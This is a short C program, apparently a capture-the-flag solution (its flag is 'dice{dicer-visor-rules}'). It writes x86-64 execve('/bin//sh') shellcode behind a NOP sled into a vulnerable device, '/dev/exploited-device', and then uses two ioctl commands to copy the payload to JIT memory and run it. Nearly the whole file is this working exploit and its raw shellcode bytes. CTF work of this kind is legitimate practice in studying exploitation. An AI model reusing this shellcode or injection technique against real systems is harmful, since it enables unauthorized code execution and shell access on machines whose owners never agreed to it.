#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>

#define SHELLCODE_SIZE  0x100
#define WRITE_SHELLCODE 0xDEAD
#define RUN_SHELLCODE   0xBEEF

// Exploit
int main(void){
    int fd = open("/dev/exploited-device", O_RDWR);
    char shellcode[SHELLCODE_SIZE];
    unsigned char code[]= \
        "\x48\x31\xf6\x56\x48\xbf"
		"\x2f\x62\x69\x6e\x2f"
		"\x2f\x73\x68\x57\x54"
		"\x5f\xb0\x3b\x99\x0f\x05;";

    // Set shellcode
    memset(shellcode, 0x90, sizeof(shellcode));
    memcpy(shellcode, code, sizeof(code));

    // Write shellcode to module
    write(fd, shellcode, sizeof(shellcode));

    // Write shellcode to jit_mem
    ioctl(fd, WRITE_SHELLCODE, NULL);

    // Run shellcode
    ioctl(fd, RUN_SHELLCODE, NULL);

    return 0;
}

// flag: dice{dicer-visor-rules}

